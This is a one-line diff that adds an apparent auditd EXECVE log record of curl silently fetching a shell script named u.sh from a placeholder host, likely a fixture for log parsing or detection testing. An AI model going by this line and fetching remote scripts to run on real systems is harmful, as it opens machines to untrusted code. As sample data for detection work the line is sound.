@@ -1,0 +1,1 @@
+type=EXECVE msg=audit(1773346680.123:456): argc=3 a0="curl" a1="-s" a2="http://cdn.stonewick.example/u.sh"
